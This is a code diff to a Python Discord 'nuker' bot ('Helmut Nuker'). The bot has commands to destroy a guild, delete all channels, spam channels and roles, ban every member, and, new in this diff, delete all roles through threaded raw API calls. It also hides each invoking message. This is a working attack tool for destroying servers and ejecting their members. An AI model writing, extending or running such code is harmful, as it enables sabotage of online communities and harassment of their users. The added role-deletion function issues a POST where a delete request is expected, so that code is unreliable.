@@ -44,12 +44,13 @@ async def help(ctx):
 
     embed = discord.Embed(
         title="Helmut Nuker",
-        description=f"""```
-{prefix}nuke - Destroy the Guild
-{prefix}cdel - Delete all Channels
-{prefix}ccr <amount> - Create Channels
-{prefix}rcr <amount> - Create Roles
-{prefix}massban - Ban all members```
+        description=f"""
+```{prefix}nuke - Destroy the Guild```
+```{prefix}cdel - Delete all Channels```
+```{prefix}ccr <amount> - Create Channels```
+```{prefix}rcr <amount> - Create Roles```
+```{prefix}massban - Ban all members```
+```{prefix}rdel - Delete all Roles```
 """,
     )
     embed.set_image(url="https://tenor.com/view/soldier-gif-14847526")
@@ -108,6 +109,7 @@ async def cdel(ctx):
 
 @helmut.command()
 async def massban(ctx):
+    await ctx.message.delete()
     for member in ctx.guild.members:
         try:
             await member.ban()
@@ -129,6 +131,17 @@ async def rcr(ctx, amount: int):
     await ctx.message.delete()
     for i in range(amount):
         threading.Thread(target=create_roles, args=(ctx.guild.id,)).start()
+        
+def role_delete(guild_id, role_id):
+  try:
+    requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
+  except:
+      pass
 
+@helmut.command()
+async def rdel(ctx):
+  await ctx.message.delete()
+  for role in ctx.guild.roles:
+    threading.Thread(target=role_delete, args=(ctx.guild.id, role.id,)).start()
 
 helmut.run(token)
